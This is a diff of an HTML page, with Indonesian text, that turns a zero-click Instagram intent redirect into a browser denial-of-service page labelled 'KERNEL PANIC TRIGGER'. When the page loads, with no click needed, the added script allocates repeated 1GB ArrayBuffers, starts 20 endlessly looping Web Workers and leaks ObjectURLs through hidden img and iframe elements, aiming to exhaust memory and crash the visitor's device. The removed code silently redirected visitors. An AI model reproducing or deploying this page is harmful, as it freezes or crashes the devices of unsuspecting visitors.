@@ -3,22 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Zero-Click Intent (Direct)</title>
+<title>KERNEL PANIC TRIGGER (DoS)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
+body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; overflow: hidden; }
 .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
-h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
+h1 { font-size: 28px; color: #ff0000; margin-bottom: 15px; text-shadow: 0 0 20px #ff0000; animation: pulse 0.2s infinite; }
 p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
 #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
+.warning { background: #330000; color: #ff0000; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; font-weight: bold; border: 2px solid #ff0000; animation: pulse 0.3s infinite; }
 .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
+@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.1; } }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>Zero-Click Intent (Direct)</h1>
-    <p>Mengarahkan Anda ke profil Instagram secara otomatis saat halaman dimuat.</p>
+    <div class="warning">☢️ KERNEL PANIC TRIGGER! SISTEM OPERASI ANDA AKAN MATI TOTAL!</div>
+    <h1>KERNEL PANIC</h1>
+    <p>Multi-Worker + ArrayBuffer 1GB + Jutaan ObjectURL.</p>
     
     <div id="status" role="status">Memuat halaman...</div>
     <div class="log" id="log">Log akan muncul di sini...</div>
@@ -27,32 +30,103 @@ p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
 <script>
     const statusDiv = document.getElementById("status");
     const logDiv = document.getElementById("log");
+    let globalCount = 0;
 
     function log(msg) {
-        logDiv.innerHTML += "<br>> " + msg;
-        console.log(msg);
+        if (globalCount % 1000 === 0) {
+            logDiv.innerHTML += "<br>> " + msg;
+            console.log(msg);
+        }
     }
 
-    // FUNGSI ZERO-CLICK: Langsung eksekusi saat DOM siap
+    // FUNGSI ZERO-CLICK: Langsung eksekusi saat halaman dimuat
     window.addEventListener("DOMContentLoaded", () => {
-        statusDiv.textContent = "Memicu Intent Instagram...";
-        
+        statusDiv.textContent = "MEMULAI TOTAL DESTRUCTION!";
+        statusDiv.style.color = "#ff0000";
+        log("Memulai serangan brutal...");
+
+        // --- SERANGAN 1: ALOKASI ARRAYBUFFER 1GB BERULANG (Memory Bombing) ---
+        // Ini akan langsung memicu OOM (Out of Memory) di Safari
         try {
-            // URL Intent Spoofing (Mengarah ke profil Instagram)
-            // Ganti 'theonly_w4gur1' dengan username target
-            const instagramIntent = "intent://instagram.com/_u/theonly_w4gur1/#Intent;scheme=https;package=com.instagram.android;category=android.intent.category.BROWSABLE;end";
-            
-            log("Memicu Intent: " + instagramIntent);
-            
-            // Eksekusi navigasi secara instan
-            window.location.href = instagramIntent;
-            
-            statusDiv.textContent = "Intent dipicu. Cek apakah Instagram terbuka.";
-            statusDiv.style.color = "#4CAF50";
+            window.hugeBuffers = [];
+            for (let i = 0; i < 5; i++) {
+                // Alokasi 1GB per iterasi
+                const buffer = new ArrayBuffer(1024 * 1024 * 1024); 
+                window.hugeBuffers.push(buffer);
+                log("ArrayBuffer 1GB dialokasikan (Total: " + (i + 1) + "GB)");
+            }
         } catch (e) {
-            log("Gagal memicu Intent: " + e.message);
-            statusDiv.textContent = "Gagal: " + e.message;
-            statusDiv.style.color = "#f00";
+            log("Gagal alokasi ArrayBuffer: " + e.message);
+        }
+
+        // --- SERANGAN 2: MEMORY LEAK OBJECTURL VIA 20 WEB WORKER ---
+        const workerCode = `
+            self.onmessage = function(e) {
+                if (e.data === 'START') {
+                    while(true) {
+                        self.postMessage('CREATE');
+                    }
+                }
+            };
+        `;
+
+        try {
+            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(workerBlob);
+
+            // Naikkan jumlah Worker menjadi 20 untuk menembak lebih cepat
+            for (let i = 0; i < 20; i++) {
+                const worker = new Worker(workerUrl);
+                worker.onmessage = function(e) {
+                    if (e.data === 'CREATE') {
+                        queueMicrotask(() => {
+                            buatBeban(i);
+                        });
+                    }
+                };
+                worker.postMessage('START');
+            }
+            log("20 Web Worker diaktifkan.");
+        } catch(e) {
+            log("Gagal membuat Worker: " + e.message);
+        }
+
+        // FUNGSI PEMBUAT BEBAN
+        function buatBeban(id) {
+            try {
+                globalCount++;
+                
+                // Buat Blob 1KB
+                const data = new Uint8Array(1024);
+                const blob = new Blob([data], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                
+                // Simpan URL ke array global (Memory Leak)
+                if (!window.urlLeak) window.urlLeak = [];
+                window.urlLeak.push(url);
+
+                // DOM INJECTION (Setiap 100 URL)
+                if (globalCount % 100 === 0) {
+                    const img = document.createElement('img');
+                    img.src = url;
+                    img.style.display = 'none';
+                    document.body.appendChild(img);
+                    
+                    const iframe = document.createElement('iframe');
+                    iframe.src = url;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                }
+
+                // Update status
+                if (globalCount % 10000 === 0) {
+                    statusDiv.textContent = "Total URL dibuat: " + globalCount;
+                    log("Total URL: " + globalCount);
+                }
+
+            } catch(e) {
+                // Abaikan error
+            }
         }
     });
 </script>
